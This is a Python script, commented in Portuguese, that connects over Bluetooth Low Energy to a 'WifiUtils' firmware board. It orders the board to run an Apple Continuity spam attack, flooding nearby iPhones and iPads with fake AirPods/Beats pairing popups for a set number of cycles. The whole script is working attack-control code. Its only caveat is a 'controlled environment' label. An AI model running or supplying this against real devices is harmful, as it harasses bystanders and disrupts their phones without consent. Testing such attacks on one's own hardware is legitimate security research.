#!/usr/bin/env python3
"""
Spam de Apple Continuity (Proximity Pairing) — gera popup de pareamento
de AirPods/Beats em iPhones próximos.

Uso:
    ~/.platformio/penv/bin/python scripts/ble_spam_test.py [--cycles 50]

O firmware ack'a com `started` em cmd_ctrl e, ao final, emite TLV
HACK_BLE_SPAM_DONE (0x22) em stream com sent/requested.
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_spam_done(payload: bytes) -> dict:
    if len(payload) < 4:
        return {"_truncated": payload.hex()}
    return {
        "sent":      int.from_bytes(payload[0:2], "big"),
        "requested": int.from_bytes(payload[2:4], "big"),
    }


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        result = {}

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4:
                return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x22:
                result.update(decode_spam_done(payload))
                print(f"← stream HACK_BLE_SPAM_DONE: {result}")
                done_evt.set()
            else:
                print(f"← stream type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {"cmd": "ble_spam_apple", "seq": 1, "cycles": args.cycles}
        payload = json.dumps(cmd)
        print(f"→ {payload}")
        print(f"→ duração estimada: {args.cycles * 0.1:.1f}s")
        print(f"→ aproxime um iPhone/iPad próximo da placa pra ver os popups")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        timeout = args.cycles * 0.1 + 10
        try:
            await asyncio.wait_for(done_evt.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            print(f"✗ timeout waiting HACK_BLE_SPAM_DONE ({timeout:.0f}s)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Apple Continuity spam via firmware WifiUtils. Para uso em ambiente controlado.",
    )
    parser.add_argument("--cycles", type=int, default=50,
                        help="Número de cycles (default 50, max 500). Cada cycle = 1 popup ~100ms.")
    args = parser.parse_args()

    asyncio.run(run(args))
